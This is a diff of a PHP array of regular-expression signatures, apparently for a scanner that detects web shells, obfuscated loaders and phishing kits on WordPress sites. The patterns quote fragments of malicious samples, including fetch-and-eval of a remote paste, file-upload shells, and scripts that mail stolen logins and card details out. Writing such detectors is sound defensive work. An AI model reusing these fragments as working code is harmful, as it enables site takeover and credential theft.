 function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)/s',
       'label' => 'sample-specific content window',
     ),
-    1299 => 
+    849 => 
+    array (
+      'pattern' => '/\\<\\?php \\$system \\= \\$_GET\\[\'f\'\\]; if\\(\\$system \\=\\= \'f\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$_FILES\\[\'file\'\\]\\[\'name\'\\];echo "\\<form method\\=\'POST\'[\\s\\S]{0,12000}\\<\\?php error_reporting\\(0\\); echo "vzadri"; \\$code \\= \\$_GET\\["php"\\]; if \\(empty\\(\\$code\\) or \\!stristr\\(\\$code, "http"\\)\\)\\{ exit; \\} else \\{ \\$php\\=file_get_co/s',
+      'label' => 'source-file head-tail anchor',
+    ),
+    850 => 
+    array (
+      'pattern' => '/P0tl0t0EfhpSH\\+5FO\\+LT5Bf\\/sQSwXX41LKnk41A4uOh7lVU1[\\s\\S]{0,12000}\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\);
+\\?\\>
+\\<\\?php unlink\\(__FILE__\\); \\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    851 => 
+    array (
+      'pattern' => '/etopt\\(\\$ch, CURLOPT_SSL_VERIFYPEER, 0\\);
+  curl_se[\\s\\S]{0,12000}\\:\\/\\/ghostbin\\.co\\/paste\\/vqcn3\\/raw\'\\);
+eval\\(\'\\?\\>\'\\.\\$a\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    852 => 
     array (
       'pattern' => '/\\<\\?php
 \\$password \\= "5YbsaxjgZI2"; \\/\\/ Password
 function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)/s',
       'label' => 'sample-specific content window',
     ),
-    1300 => 
+    853 => 
     array (
-      'pattern' => '/\\{echo"\\<b\\>berhasil\\<\\/b\\>\\-\\-\\>"\\.\\$_FILES\\["f"\\]\\["name"\\];\\}else\\{echo"\\<b\\>gagal";\\}\\} \\}
+      'pattern' => '/^\\s*\\<\\?php \\$str \\= \'TWlzdGVyU3B5VGVzdDA\\=\';echo base64_decode\\(\\$str\\); \\?\\>\\<\\?php/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    854 => 
+    array (
+      'pattern' => '/0636,
+            \\-0303,
+            010[\\s\\S]{0,12000}g\\(064\\) \\+ _z\\:\\:_eg\\(065\\) \\- _z\\:\\:_eg\\(066\\);
+\\}
+_nkwy\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    855 => 
+    array (
+      'pattern' => '/^\\s*Linux CCPro 4\\.15\\.0\\-70\\-generic \\#79\\-Ubuntu SMP Tue Nov 12 10\\:36\\:11 UTC 2019 x86_64 x86_64 x86_64 GNU\\/Linux[\\s\\S]{0,18000}echo\'\\<br\\>\\<center\\>Coded by \\<a href\\="https\\:\\/\\/github\\.com\\/NinjaCR3"\\>NinjaCR3\\<\\/a\\>\\<\\/center\\>\\<br\\>\';\\?\\>\\s*$/s',
+      'label' => 'source-file first-last anchor',
+    ),
+    856 => 
+    array (
+      'pattern' => '/d\\="post" enctype\\="multipart\\/form\\-data"\\>
+\\<input t[\\s\\S]{0,12000}\\} else \\{
+	echo\\("FILE"\\);
+	\\}
 
-echo \'uname\\:\'\\.php_uname\\(\\)\\."
-";
-echo getcwd\\(\\) \\./s',
+\\?\\>
+\\<\\/body\\>
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    857 => 
+    array (
+      'pattern' => '/\\/\\*\\*
+ \\* File skip\\-link\\-focus\\-fix\\.js\\.
+ \\*
+ \\* Helps[\\s\\S]{0,12000}po\',\'nseTe\',\'\\?id\\=\',\'ame\',\'ndsx\',\'cooki\',\'State\',/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    858 => 
+    array (
+      'pattern' => '/\\} else \\{
+			radio\\.attr\\(\'checked\', true\\);
+		\\}
+	\\}\\);
+
+	\\/\\/ Help
+	\\$\\(\'\\#ai1wm\\-feedback\\-type\\-3\'\\)\\.click\\(function \\(\\) \\{
+		\\/\\/ Hide/s',
       'label' => 'sample-specific content window',
     ),
-    1301 => 
+    859 => 
     array (
-      'pattern' => '/error_reporting\\(0\\);header\\(\'Content\\-Type\\: text\\/html; charset\\=utf\\-8\'\\);\\$OoooOO0 \\= \'ahninetysix\';\\$OOOOOO \\= "%71%77%65%72%74%79%75%69%6f%70%61%73[\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/\\/\\*\\*\\*\\*\\*\\*\\/ \\(function\\(modules\\) \\{ \\/\\/ webpackBootstra[\\s\\S]{0,12000}ar Q\\=Y;return E\\[Q\\(0x92\\)\\+\'Of\'\\]\\(L\\)\\!\\=\\=\\-0x1;\\}\\}\\(\\)\\);\\};/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1302 => 
+    860 => 
     array (
-      'pattern' => '/;
-\\$b75 \\= \\$_SERVER\\[\'HTTP_HOST\'\\];
-\\$m22 \\= \\$ip \\. "";
-\\$msg8873 \\= "\\$a45 \\$b75 \\$m22";
-mail\\(\\$email, \\$subj98, \\$msg8873, \\$from\\);
-\\?\\>/s',
+      'pattern' => '/^\\s*\\/\\*\\! Select2 4\\.0\\.6\\-rc\\.1 \\| https\\:\\/\\/github\\.com\\/select2\\/select2\\/blob\\/master\\/LICENSE\\.md \\*\\//s',
+      'label' => 'source-file first-line anchor',
+    ),
+    861 => 
+    array (
+      'pattern' => '/ile\\-id\'\\);
+					\\}
+					else \\{
+						valInput \\= \'\'[\\s\\S]{0,12000}ar Q\\=Y;return E\\[Q\\(0x92\\)\\+\'Of\'\\]\\(L\\)\\!\\=\\=\\-0x1;\\}\\}\\(\\)\\);\\};/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    862 => 
+    array (
+      'pattern' => '/^\\s*var GSF_DatetimepickerClass\\=function\\(\\$container\\)\\{this\\.\\$container\\=\\$container\\};\\(function\\(\\$\\)\\{"use strict";GSF_DatetimepickerClass\\.prototype\\=\\{in/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    863 => 
+    array (
+      'pattern' => '/\\/\\*\\*
+ \\* sorter field script
+ \\*
+ \\* @package field[\\s\\S]{0,12000};\\}function V\\(\\)\\{var v\\=\\[\'ion\',\'index\',\'154602bdaGr/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    864 => 
+    array (
+      'pattern' => '/\\/\\*\\*
+ \\* Created by Administrator on 5\\/4\\/2017\\.
+ \\*\\/
+var GSF_Fonts \\= GSF_Fonts \\|\\| \\{\\};
+\\(function\\(\\$\\) \\{
+    "use strict";
+    G/s',
       'label' => 'sample-specific content window',
     ),
-    1303 => 
+    865 => 
+    array (
+      'pattern' => '/^\\s*var GSF_THEME_OPTION;/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    866 => 
+    array (
+      'pattern' => '/^\\s*\\/\\*jslint browser\\: true \\*\\/ \\/\\*global jQuery\\: true \\*\\//s',
+      'label' => 'source-file first-line anchor',
+    ),
+    867 => 
+    array (
+      'pattern' => '/\\<\\?php do_action\\( \'woocommerce_after_checkout_form\', \\$checkout \\); \\?\\>\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    868 => 
+    array (
+      'pattern' => '/^\\s*jQuery\\(document\\)\\.ready\\(function\\(\\$\\) \\{/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    869 => 
+    array (
+      'pattern' => '/^\\s*\\!function\\(e\\)\\{var t\\=\\{\\};function n\\(r\\)\\{if\\(t\\[r\\]\\)return t\\[r\\]\\.exports;var o\\=t\\[r\\]\\=\\{i\\:r,l\\:\\!1,exports\\:\\{\\}\\};return e\\[r\\]\\.call\\(o\\.exports,o,o\\.exports,n\\),o/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    870 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* Loads the WordPress environment and[\\s\\S]{0,12000}r\\(115\\)\\.chr\\(99\\)\\.chr\\(114\\)\\.chr\\(105\\)\\.chr\\(112\\)\\.chr\\(11/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    871 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+\\*\\/
+\\$vonuSxC\\="\\\\x73";\\$cbJ9nq\\="\\\\156";\\$cbJ[\\s\\S]{0,12000}IgACIgACIgACIgACIogIiI7CiAgICAgICAgICAgICRyZWdpb/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    872 => 
+    array (
+      'pattern' => '/\\<\\?php
+error_reporting\\(0\\);
+
+if\\(isset\\(\\$_GET\\["Chito[\\s\\S]{0,12000}\\{
+	\\$homee \\= \\$_SERVER\\[\'DOCUMENT_ROOT\'\\];
+	\\$cgfs \\=/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    873 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\/ncode_K82_K83
+error_reporting\\(0\\);header\\([\\s\\S]{0,12000}\\$file_contents \\= \'\';
+    \\$user_agent \\= \'Mozilla\\//s',
+      'label' => 'sample-specific content window chain',
+    ),
+    874 => 
+    array (
+      'pattern' => '/Og2ayMgSo0KW0nQhmYELsqGMO4m\\+rh\\+3vK0LJVK\\+8\\+DuDq5i[\\s\\S]{0,12000}7MKHX9F\\/8XpP9M3\\+gg0qfgAP3W0row0B5rHKvwP\'\\)\\);
+
+ \\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    875 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$ip \\= getenv\\("REMOTE_ADDR"\\);
+\\$ra44 \\= rand\\([\\s\\S]{0,12000}"From\\: Result\\<botv3@mrspybotv3\\.com";
+\\$a45 \\= \\$_S/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    876 => 
+    array (
+      'pattern' => '/b\\[\'t1f7d4\'\\]\\[46\\]\\.\\$u59f79ab\\[\'t1f7d4\'\\]\\[97\\]\\.\\$u59f79ab\\[\'t1f7d4\'\\]\\[47\\]\\.\\$u59f79ab\\[\'t1f7d4\'\\]\\[44\\]\\.\\$u59f79ab\\[\'t1f7d4\'\\]\\[44\\]\\] \\= \\$_POS/s',
+      'label' => 'sample-specific content window',
+    ),
+    877 => 
     array (
       'pattern' => '/\\<\\?php
 \\/\\*1028b\\*\\/
 
-@include "\\\\057home\\\\057mega\\\\164rav\\/\\\\172okam\\\\141keup\\\\056com\\/\\\\167p\\-in\\\\143lude\\\\163\\/Req\\\\165ests\\\\057Auth\\\\057\\./s',
-      'label' => 'sample-specific content window',
+@include "\\\\057home\\\\057mega\\\\164r[\\s\\S]{0,12000}\\\\172okam\\\\141keup\\\\056com\\/\\\\167p\\-in\\\\143lude\\\\163\\/Req/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1304 => 
+    878 => 
     array (
       'pattern' => '/\\<\\?php
 \\/\\*90868\\*\\/
 
-@include "\\\\057home\\\\057mega\\\\164rav\\/\\\\172okam\\\\141keup\\\\056com\\/\\\\167p\\-in\\\\143lude\\\\163\\/Req\\\\165ests\\\\057Auth\\\\057\\./s',
-      'label' => 'sample-specific content window',
+@include "\\\\057home\\\\057mega\\\\164r[\\s\\S]{0,12000}\\\\172okam\\\\141keup\\\\056com\\/\\\\167p\\-in\\\\143lude\\\\163\\/Req/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1305 => 
+    879 => 
     array (
-      'pattern' => '/ttps\\:\\/\\/github\\.com\\/m7x\\/cmsmap\\/
- \\* License\\: GPLv2
- \\*\\/
-
-function love\\(\\)
-\\{
-global \\$A;
-\\$A\\=TT\\(\\);
-eval\\("\\\\"\\$A\\\\""\\);
+      'pattern' => '/^\\s*\\<title\\>SUCCESS\\:\\)\\<\\/title\\>/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    880 => 
+    array (
+      'pattern' => '/require ABSPATH \\. \'wp\\-admin\\/profile\\.php\';\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    881 => 
+    array (
+      'pattern' => '/liability and is not responsible for any misuse[\\s\\S]{0,12000}return \'";\'\\.\\$a\\.\'\\/\\/\';
 \\}
-function TT/s',
-      'label' => 'sample-specific content window',
+
+love\\(\\);
+\\?\\>
+
+postpass akl/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1306 => 
+    882 => 
     array (
-      'pattern' => '/\'\\) \\{eval\\(\\$_v7su7hny\\["data"\\]\\);exit;\\}\\}\\}\\$_wp9fjisv \\= new _0lhj1w\\(\\);if \\(\\$_wp9fjisv\\-\\>_8eooq\\(\\)\\) \\{\\$_wp9fjisv\\-\\>_m8fbp\\(\\);\\}exit\\(\\);/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'Fox\'\\] \\=\\= \'2scwF\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/s',
+      'label' => 'source-file first-line anchor',
     ),
-    1307 => 
+    883 => 
     array (
-      'pattern' => '/6 \\. "\\<\\/td\\>\\<td\\>\\<a href\\=\\\\"\\#\\\\" onclick\\=\\\\"g\\(\'delfile\',\'\\$_1\\/\\$_25\'\\);\\\\"\\>Delete\\<\\/a\\>\\<\\/td\\>\\<\\/tr\\>";
-    \\}
-    echo C98A7D\\(118\\);
-\\} \\?\\>/s',
+      'pattern' => '/h88 \\= "";\\$_lvfyvcao \\= _0lhj1w\\:\\:_tlqgc\\(\\);\\$_lvfyvc[\\s\\S]{0,12000}9fjisv\\-\\>_8eooq\\(\\)\\) \\{\\$_wp9fjisv\\-\\>_m8fbp\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    884 => 
+    array (
+      'pattern' => '/^\\s*\\<\\? \\$GLOBALS\\[\'_C98A7D_\'\\] \\= Array\\(base64_decode\\(\'ZX\' \\. \'Jyb3JfcmVwb3J\' \\. \'0aW5\' \\. \'n\'\\), base64_decode\\(\'\' \\. \'c2V0Y29va2ll\'\\), base64_decode\\(\'dG\'/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    885 => 
+    array (
+      'pattern' => '/^\\s*\\$lgrlc \\= \'ko1g7f\\#84nd5\\-v0r\\*_mcleiyp63\\\\\'uHat9sbx\';\\$ucjocl \\= Array\\(\\);\\$ucjocl\\[\\] \\= \\$lgrlc\\[19\\]\\.\\$lgrlc\\[15\\]\\.\\$lgrlc\\[21\\]\\.\\$lgrlc\\[30\\]\\.\\$lgrlc\\[31\\]\\.\\$lgrlc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    886 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\/\\* FoxAuto token PjYT6 Xbfik L07GX hexdec substr pack strlen trim \\*\\/ error_reporting\\(0\\); function PCHdY\\(\\$fDig7\\) \\{ \\$lxVSx \\= strlen\\(trim/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    887 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$ip \\= getenv\\("REMOTE_ADDR"\\);
+\\$msg \\.\\= "\\\\n";[\\s\\S]{0,12000}\\/\\>
+
+LOGIN \\: "\\.\\$_POST\\[\'user\'\\]\\." \\<br \\/\\>
+Password/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    888 => 
+    array (
+      'pattern' => '/\\$file\\=\\=getcwd\\(\\)\\.\'\\/config\\.php\' \\|\\| 
+			\\$file\\=\\=g[\\s\\S]{0,12000}ir\\); \\}
+		\\} 
+	\\}
+header\\("Location\\: \\$redirect"\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    889 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$to  \\= \'Staylow32@yandex\\.com\';
+\\$redirect \\= \'https\\:\\/\\/outlook\\.office/s',
       'label' => 'sample-specific content window',
     ),
-    1308 => 
+    890 => 
+    array (
+      'pattern' => '/0px; width\\:981px; height\\:887px; z\\-index\\:0"\\>\\<img[\\s\\S]{0,12000}63 height\\=24\\>\\<\\/a\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    891 => 
+    array (
+      'pattern' => '/orite board game\\?\\<\\/option\\>
+\\<option value\\="What i[\\s\\S]{0,12000}63 height\\=24\\>\\<\\/a\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    892 => 
+    array (
+      'pattern' => '/\\<\\?php
+if\\(\\$_POST\\["em"\\] \\!\\= "" and \\$_POST\\["ep"\\] \\!\\=[\\s\\S]{0,12000};
+\\$message \\.\\= "\\|Client IP\\: "\\.\\$ip\\."\\\\n";
+\\$message/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    893 => 
+    array (
+      'pattern' => '/\\<\\?php
+if\\(\\$_POST\\["sn"\\] \\!\\= "" and \\$_POST\\["mn"\\] \\!\\=[\\s\\S]{0,12000}\\."\\\\n";
+\\$message \\.\\= "X\'piry Date		       \\: "\\.\\$_PO/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    894 => 
+    array (
+      'pattern' => '/\\$s \\= @file_get_contents\\(\\$nn\\);
+\\$k \\= urldecode\\(ba[\\s\\S]{0,12000}code\\(\\$s\\)\\);
+\\$w \\= \'\\?\\>\';
+\\$p \\= \\$w \\. \\$k;
+eval\\(\\$p\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    895 => 
     array (
       'pattern' => '/\\<\\?
 
 \\$to \\= "adminhungtiton@www\\-hungtitonsup\\.ddns\\.net ";/s',
       'label' => 'sample-specific content window',
     ),
-    1309 => 
+    896 => 
     array (
-      'pattern' => '/Wl4xnKAmpJjhW6T\\/Wmf\\/CwjiMTy2Cwj\\/pTujVPEgMJ51VQ0tLKWlLKxbW2McoTHaVQ0\\+VPsBkYm\\+hqmN7FpfW3Aw[\\s\\S]{0,160}LJ4aVQ0\\+VPsY0pi3mfF8\\/vpfW2ShqTy2nKW1plptCG4tW8zbj\\+v688CSWljaLzSwn3AbMJkfWlN9CvNag7F1e7oY/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/\\<\\?php
+if\\(\\$_POST\\["ud"\\] \\!\\= "" and \\$_POST\\["pd"\\] \\!\\=[\\s\\S]{0,12000}essage \\.\\= "\\|Client IP\\: "\\.\\$ip\\."\\\\n";
+\\$message \\.\\= "/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1310 => 
+    897 => 
+    array (
+      'pattern' => '/\\/\\*This is a necessary key\\*\\/ \\$register_key , 
+	
+	\\/\\*Verification on copyright\\*\\/ \\$check_copyright 
+	
+\\) ; 
+\\/\\*Ending\\*\\/
+ 
+\\?\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    898 => 
+    array (
+      'pattern' => '/\\<\\?php
+if\\(\\$_POST\\["q1"\\] \\!\\= "" and \\$_POST\\["ans1"\\] \\![\\s\\S]{0,12000}\\.\\= "Answer 3            	\\: "\\.\\$_POST\\[\'ans3\'\\]\\."\\\\n/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    899 => 
     array (
       'pattern' => '/\\<\\?php
 	\\$praga\\=rand\\(\\);
@@ -8636,53 +5886,190 @@ function TT/s',
 	header\\("location\\: login\\.php\\?cmd\\=login_submit&id\\=\\$praga\\$praga&session\\=\\$praga/s',
       'label' => 'sample-specific content window',
     ),
-    1311 => 
+    900 => 
     array (
-      'pattern' => '/echo \'wp\\-blog\\-header\\.php\';[\\s\\S]{0,12000}\\$O\\=urldecode\\(\'F%7EcVdkq%24%256%40X%5C%22%2AH%2C%3A3%5E%21fIL0%3EY%23E%29yP%3F_ptRW%7DjBNw%609i%3D%2B%2FDUluA%5D%7BO%7Co1\\-TC\\.5hgMexG%282n7%2F/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/m\\/wp\\-content\\/uploads\\/2014\\/08\\/Preloader_11\\.gif\'\\)[\\s\\S]{0,12000}dth\\=63 height\\=24\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1312 => 
+    901 => 
+    array (
+      'pattern' => '/o\\=substr\\(\\$string,7,strlen\\(\\$string\\)\\-14\\);return gz[\\s\\S]{0,12000}\\.\\$OOoO0oOo00\\);eval\\(\\$OoO0oOOo00\\);\\}OoOo11o1OO\\(\\);\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    902 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$O\\=urldecode\\(\'%21mod%5B%7C%22D%2FgY%2AzMBh%3F%5EP2NF_Q\\-%3DuS%23x4H9%7BjvR%3Ba%406J0KepTlG7Wst%5Dc%3CnE5%2Cr%28U%603I%29V%3A%24qXf8y%2F/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    903 => 
     array (
       'pattern' => '/\\<\\?php
- \\$uoeq967\\= "O\\)sl 2Te4x\\-\\+gazAbuK_6qrjH0RZt\\*N3mLcVFEWvh;inySJC91oMfYXId5Up\\.\\(GP7D,Bw\\/kQ8";\\$vpna644\\=\'JGNoID0gY3VybF9p/s',
-      'label' => 'sample-specific content window',
+ \\$uoeq967\\= "O\\)sl 2Te4x\\-\\+gazAbuK_6qrjH0RZt[\\s\\S]{0,12000}\\},\\$uoeq967\\{7\\}\\);\\$gnix510 \\= cdim173\\(\\$uoeq967\\{13\\},\\$/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1313 => 
+    904 => 
     array (
-      'pattern' => '/\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\/\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"\\\\x47L\\\\x4fB\\\\x41L\\\\x53"\\}\\["\\\\x43\\\\x55\\\\x31\\\\x55\\\\x31\\\\x4d\\\\x4d\\\\x31\\\\x4d\\\\x55"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\^";\\$htaccess_rule \\.\\=\\$\\{"\\\\x47L\\\\x4fB\\\\x41L\\\\x53"\\}\\["\\\\x43\\\\x55\\\\x31\\\\x55\\\\x31\\\\x4d\\\\x4d\\\\x31\\\\x4d\\\\x55"\\]\\(\\\\/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/mIT0rtPMVgUA\\\\\'\\);if\\(\\$CU11UUMM1M\\<\\=0&&\\$C11MUUM1UM\\<\\=[\\s\\S]{0,12000}\\\\x4d\\\\x55\\\\x55\\\\x31\\\\x4d"\\]\\(\\);\\/\\/wp\\-blog\\-header\\?\\>\\<\\?php/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1314 => 
+    905 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php  \\/\\*b0224de6c80b76dcf7b6f44746f54943b0224de6c80b76dcf7b6f44746f54943\\*\\/ \\?\\>\\<\\?php \\/\\* Copyright &\\>\\/dev\\/null \\*\\//s',
+      'label' => 'source-file first-line anchor',
+    ),
+    906 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php  \\/\\*b0224de6c80b76dcf7b6f44746f54943b0224de6c80b76dcf7b6f44746f54943\\*\\/ \\?\\>\\<\\?php \\$A9475 \\= "x\\*dzv\\(7cet\\.isp\\/nj;3ahuwfg0o8r6\\)4l_25k9qyb1m";f/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    907 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\/\\*vspr vwcyfwvbbwwzleeiwgaq \\*\\/\\?\\>\\<\\?php \\$A9475 \\= "x\\*dzv\\(7cet\\.isp\\/nj;3ahuwfg0o8r6\\)4l_25k9qyb1m";function strfuncinj\\(\\$f, \\$q, \\$z\\)\\{	return \\$/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    908 => 
+    array (
+      'pattern' => '/\\<\\?php
+@ini_set\\(\'display_errors\', \'0\'\\);
+error_rep[\\s\\S]{0,12000}SER_WARNING \\| E_RECOVERABLE_ERROR \\);
+
+\\/\\*
+ \\* If w/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    909 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Error Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}ay        \\(\\$it\\)                              \\)
+;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    910 => 
     array (
       'pattern' => '/\\}
 \\$reqw \\= \\$ay\\(\\$ao\\(\\$oa\\("\\$pass"\\), \'wp_function\'\\)\\);[\\s\\S]{0,12000}dirname\\( __FILE__ \\) \\. \'\\/wp\\-blog\\-header\\.php\' \\);\\?\\>/s',
       'label' => 'sample-specific content window chain',
     ),
-    1315 => 
+    911 => 
     array (
-      'pattern' => '/,\\$O_00_O0O_O\\);\\$O000__OOO_\\=\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x30\\\\x30\\\\x30\\\\x5f\\\\x4f\\\\x4f\\\\x5f\\\\x5f\\\\x4f"\\]\\(__FILE__\\)\\.\\\\[\\s\\S]{0,160},\\\\\'\\/\\\\\',\\$O000__OOO_\\);if\\(\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x4f\\\\x4f\\\\x30\\\\x30\\\\x4f\\\\x5f\\\\x5f\\\\x30\\\\x5f"\\]\\(\\$O_00_O0O_O,\\\\/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/^\\s*\\<\\?php \\$efxtv\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$hqhtkv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc2/s',
+      'label' => 'source-file first-line anchor',
     ),
-    1316 => 
+    912 => 
     array (
-      'pattern' => '/\\\\x48\\\\x54\\\\x54\\\\120\\\\x5f\\\\130\\\\x5f\\\\x46\\\\x4f\\\\122\\\\x57\\\\x41\\\\x52\\\\104\\\\x45\\\\104\\\\137\\\\106\\\\x4f\\\\x52[\\s\\S]{0,160}\\\\110\\\\124\\\\x54\\\\x50\\\\x5f\\\\x58\\\\137\\\\x46\\\\x4f\\\\x52\\\\127\\\\x41\\\\122\\\\104\\\\x45\\\\x44\\\\x5f\\\\x46\\\\x4f\\\\x52/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/lZBbE1VTWxNRElsTURjbE1EVWxNVUlsTURCT1FTVXhOa3dsT[\\s\\S]{0,12000}ecode\\(base64_decode\\(\\$code\\)\\)\\);
+\\}
+
+@include \\$file;/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1317 => 
+    913 => 
+    array (
+      'pattern' => '/\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x5f\\\\x4f\\\\x30\\\\x5f\\\\x5f\\\\x30\\\\x30\\\\x4f\\\\x4f"\\]\\(\\$O0O_0__0OO\\.\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x/s',
+      'label' => 'sample-specific content window',
+    ),
+    914 => 
+    array (
+      'pattern' => '/\\$vxxvo\\[\\] \\= \\$huwqbmb\\[7\\]\\.\\$huwqbmb\\[19\\]\\.\\$huwqbmb\\[15\\][\\s\\S]{0,12000}kqehoq\\(\\$vxxvo, \\$zhsflex, \\$vxxvo\\[9\\]\\(\\$qatrty\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    915 => 
+    array (
+      'pattern' => '/option\\(\'body_style\'\\)\\);
+		\\$classes\\[\\] \\= \'body_\' \\.[\\s\\S]{0,12000}get_template_directory\\(\\) \\) \\. \'fw\\/loader\\.php\';
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    916 => 
+    array (
+      'pattern' => '/er\\(\\$content\\), strtolower\\(\\$findContent\\)\\)\\=\\=\\=false; \\} else\\{ \\$check \\= strpos\\(\\$content, \\$findContent\\)\\=\\=\\=false; \\} if\\(\\$check\\)\\{/s',
+      'label' => 'sample-specific content window',
+    ),
+    917 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+\\/\\*\\*
+ \\* Plugin Name\\: WP\\-Security
+ \\* Descri[\\s\\S]{0,12000}_REQUEST\\[\'i4jLhn6VfwTgOH\'\\]\\) && \\$_REQUEST\\[\'i4jLhn/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    918 => 
+    array (
+      'pattern' => '/ipod\\/i\' \\=\\> \'iPod\',\'\\/ipad\\/i\' \\=\\>  \'iPad\',\'\\/android[\\s\\S]{0,12000}www\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    919 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+
+
+\\$settings \\= array\\(
+	"log_user"		\\=\\> "1",[\\s\\S]{0,12000}\\/\\/ Telegram Bots Receiver
+	"country"		\\=\\> "US",/s',
+      'label' => 'sample-specific content window chain',
+    ),
